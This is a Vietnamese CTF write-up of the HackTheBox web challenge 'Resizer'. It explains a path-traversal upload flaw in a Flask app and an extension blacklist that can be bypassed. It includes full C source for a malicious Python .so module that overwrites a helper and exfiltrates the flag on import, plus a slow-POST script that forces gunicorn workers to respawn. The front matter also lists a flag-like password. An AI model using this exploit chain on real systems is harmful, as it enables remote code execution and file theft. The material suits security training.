---
layout: single
title: "Resizer"
date: 2026-04-20 10:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, Path traversal, Arbitrary File Upload , Challenge ,Hackthebox]
password: "HTB{active1705}"
---

# Resizer - Hard - Web

## Context

Challenge là một web app Flask cho phép upload ảnh rồi resize bằng Pillow. Endpoint chính là `POST /resize` :

```python
@app.route('/resize', methods=['POST'])
def upload_file():
...
```

Luồng xử lý:

- nhận file upload
- lưu file vào thư mục `uploads`
- gọi `resizer()` để resize
- trả file `<name>_resized.<ext>` bằng `send_file()`

Điểm yếu nằm ở việc server dùng trực tiếp `file.filename` để ghép path:

```python
filename = file.filename
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
file.save(filepath)
```

Do đó có thể path traversal bằng filename như `../something`.

Ở `challenge/app.py:62-66`, filename không được sanitize. Vì vậy có thể ghi file ra ngoài `uploads/`.

```python
filename = file.filename
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(filepath):
        return "File already exists. Please rename your file and try again.", 400
    file.save(filepath)
```

Ngoài ra blacklist extension chỉ chặn:

- `.py`
- `.pyc`

ở `challenge/app.py:18-29`.

```python
BLACKLISTED_EXTENTIONS = {'.py', '.pyc'}

CONTENT_TYPE_BLACKLIST = {'application/x-python-code', 'application/x-python-bytecode', 'text/x-python'}


def is_extention_blacklisted(filename):
    for ext in BLACKLISTED_EXTENTIONS:
        if ext in filename:
            return True

def is_content_type_blacklisted(content_type):
    return content_type in CONTENT_TYPE_BLACKLIST
```

Nó **không chặn `.so`**, nên có thể upload native Python extension.

## Flow exploit

App import helper module từ `utils.helpers` :

```python
import utils.helpers as helpers
```

Ý tưởng là:

1. dùng path traversal để ghi đè `utils/helpers.cpython-312-x86_64-linux-gnu.so`
2. khi worker gunicorn mới được spawn, Python sẽ import `utils.helpers`
3. nếu extension `.so` được ưu tiên load, payload sẽ chạy lúc import
4. payload copy `/app/flag.txt` thành `/app/loot_resized.txt`
5. upload tiếp file tên `../loot.txt` để app gọi `send_file('/app/loot_resized.txt')`

## Exploit

### Upload malicious helpers

Upload file `.so` vào:

- `../utils/helpers.cpython-312-x86_64-linux-gnu.so`

```C
#include <stdio.h>
#include <Python.h>

static void drop_flag(void) {
    FILE *in  = fopen("/app/flag.txt", "rb");
    if (!in) return;
    FILE *out = fopen("/app/__TOKEN___resized.txt", "wb");
    if (!out) { fclose(in); return; }

    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0)
        fwrite(buf, 1, n, out);

    fclose(out);
    fclose(in);
}

static PyObject *resize_image(PyObject *self, PyObject *args)          { Py_RETURN_NONE; }
static PyObject *crop_image(PyObject *self, PyObject *args)            { Py_RETURN_NONE; }
static PyObject *convert_image_format(PyObject *self, PyObject *args)  { Py_RETURN_NONE; }

static PyMethodDef methods[] = {
    {"resize_image",          resize_image,          METH_VARARGS, NULL},
    {"crop_image",            crop_image,            METH_VARARGS, NULL},
    {"convert_image_format",  convert_image_format,  METH_VARARGS, NULL},
    {NULL, NULL, 0, NULL}
};

static struct PyModuleDef module = {
    PyModuleDef_HEAD_INIT,
    "helpers",
    NULL,
    -1,
    methods
};

PyMODINIT_FUNC PyInit_helpers(void) {
    drop_flag();
    return PyModule_Create(&module);
}
```

### Bước 2: Cố ép gunicorn respawn worker

Sau đó dùng `http multipart form data` để giữ một request multipart mở thật chậm, với ý tưởng làm worker timeout rồi respawn :

```python
sock = socket.socket()
sock.settimeout(5)
sock.connect((host, port))
# Gửi HTTP request header
sock.sendall(b"POST /resize HTTP/1.1\r\nHost: TARGET:PORT\r\n"
    b"Content-Length: 99999\r\n"
    b"Content-Type: multipart/form-data; boundary=xxx\r\n\r\n")
# Gửi body cực chậm — 1 byte/giây
for _ in range(35):
    sock.send(b"A")
    time.sleep(1)
```
Khi timeout, gunicorn sẽ respawn worker và malicious `.so` của ta được load.

### Bước 3: Lấy flag qua send_file

Nếu worker mới import lại malicious module thành công, payload sẽ tạo file:

- `/app/loot_resized.txt`

Sau đó script upload file tên:

- `../loot.txt`

```python
filename = file.filename
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(filepath):
        return "File already exists. Please rename your file and try again.", 400
    file.save(filepath)

    try:
        resizer(800, 800, "resize", filepath)
        new_resize_path = filepath.rsplit('.', 1)[0] + '_resized.' + filepath.rsplit('.', 1)[1]
        return send_file(
            new_resize_path,
            as_attachment=True,
            download_name=os.path.basename(new_resize_path)
        )
```

App sẽ tính ra output path:

- `/app/loot_resized.txt`

và trả nội dung file đó bằng `send_file()`.
